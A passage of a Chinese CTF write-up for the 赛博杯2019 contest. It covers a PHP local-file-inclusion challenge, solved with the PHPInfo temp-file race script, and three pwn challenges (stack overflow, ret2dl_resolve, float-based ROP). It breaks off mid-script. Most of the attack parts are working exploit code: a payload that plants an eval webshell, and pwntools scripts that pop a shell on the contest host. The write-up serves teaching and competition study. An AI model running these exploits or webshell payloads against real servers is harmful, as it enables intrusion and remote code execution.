<p>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<p>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a>验证漏洞，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/13.png" alt="13"></p>
<p>成功。</p>
<p>文章如是说：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">先讲一下利用phpinfo上传文件，然后在文件包含的原理：</span><br><span class="line"></span><br><span class="line">参考链接：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/tree/m</span>aster<span class="regexp">/php/i</span>nclusion</span><br><span class="line"></span><br><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是<span class="regexp">/tmp/</span>php[<span class="number">6</span>个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class="line"></span><br><span class="line">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class="line"></span><br><span class="line">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）PHP默认缓冲区大小是<span class="number">4096</span>，即PHP每次返回<span class="number">4096</span>个字节给socket连接</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）所以，我们直接操作原生socket，每次读取<span class="number">4096</span>个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出<span class="number">4096</span>个字节，所以临时文件还未被删除</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>

<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/15.png" alt="15"></p>
<p>运行脚本</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/16.png" alt="16"></p>
<p>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）</p>
<p>先验证是否上传成功</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/70.png" alt="70"></p>
<p>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell</p>
<p>于是<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/36.png" alt="36"></p>
<p>flag应该在那个奇怪名字的文件里吧</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/28.png" alt="28"></p>
<p>果然，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/89.png" alt="89"></p>
<p>拿到flag</p>
<p>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"pwn1"</span>)</span><br><span class="line"><span class="attr">sh</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">lib</span> = <span class="number">0</span></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	<span class="keyword">if</span>(<span class="attr">debug</span> == <span class="number">1</span>):</span><br><span class="line">		<span class="attr">sh</span> = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		<span class="attr">sh</span> = remote(ip,port)</span><br><span class="line">	<span class="attr">payload</span> = '\x00' * <span class="number">120</span> +<span class="string">"aaaa"</span> + <span class="string">"\x00"</span></span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">	pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10001</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/59.png" alt="59"></p>
<h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve，用ctf-wiki的脚本改一下就可以拿到shell了</p>
<p>利用roputils简化攻击</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line"><span class="comment">#r = process('./pwn3')</span></span><br><span class="line">r = remote(<span class="string">"47.110.227.208"</span>,10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/35.png" alt="35"></p>
<h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>这题考察了确定浮点寄存器通过movss写入内存时的数值</p>
<p>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">elf = ELF(<span class="string">"pwn2"</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line">def inputFloat(<span class="built_in">num</span>):</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.<span class="built_in">send</span>(<span class="built_in">num</span>)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline()</span><br><span class="line">def inputRop(<span class="built_in">num</span>):</span><br><span class="line">	<span class="built_in">num</span> = str(<span class="built_in">num</span>)</span><br><span class="line">	<span class="built_in">num</span> = <span class="built_in">num</span>.rjust(<span class="number">45</span>,<span class="string">"0"</span>)</span><br><span class="line">	<span class="built_in">num</span> = <span class="built_in">num</span>.ljust(<span class="number">0x62</span>,<span class="string">"0"</span>)</span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="built_in">num</span>)</span><br><span class="line">	inputFloat(<span class="string">"0"</span>)	</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	<span class="built_in">global</span> sh</span><br><span class="line">	<span class="built_in">global</span> lib</span><br><span class="line">	<span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">		sh = <span class="built_in">process</span>(<span class="string">"./pwn2"</span>)</span><br><span class="line">		lib = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF(<span class="string">"libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line">	<span class="comment">#puts 5879714 0x400640</span></span><br><span class="line">	<span class="comment">#pop_rdi 5881041 0x4009f3</span></span><br><span class="line">	<span class="comment">#__libc_start_main_got 8822026 0x601038</span></span><br><span class="line">	<span class="comment">#main 5880847 0x400969</span></span><br><span class="line">	<span class="comment">#start 5879938 0x4006E0</span></span><br><span class="line">	<span class="comment">#call vul 5880867 0x400977</span></span><br><span class="line">	<span class="comment">#vul 5880653 0x4008DE</span></span><br><span class="line">	<span class="comment">#read 5879781 0x400670</span></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret 5881038 0x4009f1</span></span><br><span class="line">	<span class="comment">#read_got 8822014 0x601030</span></span><br><span class="line">	<span class="comment">#binsh 8822106 0x601071</span></span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(<span 